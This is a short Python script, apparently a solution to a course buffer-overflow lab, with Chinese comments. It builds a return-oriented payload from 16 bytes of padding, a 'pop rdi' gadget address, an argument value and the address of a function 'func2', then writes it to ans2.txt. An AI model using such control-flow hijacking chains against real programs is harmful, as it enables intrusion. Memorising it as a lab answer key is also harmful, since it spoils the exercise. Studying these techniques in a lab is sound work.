# 偏移量：16字节
padding = b'A' * 16
    
# pop_rdi指令地址
pop_rdi_addr = b'\xc7\x12\x40\x00\x00\x00\x00\x00'
    
# func2的参数
func2_param = b'\xf8\x03\x00\x00\x00\x00\x00\x00'
    
# func2的入口地址
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'
    
# 拼接
payload = padding + pop_rdi_addr + func2_param + func2_addr
    
# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)
    
print("payload已保存到ans2.txt")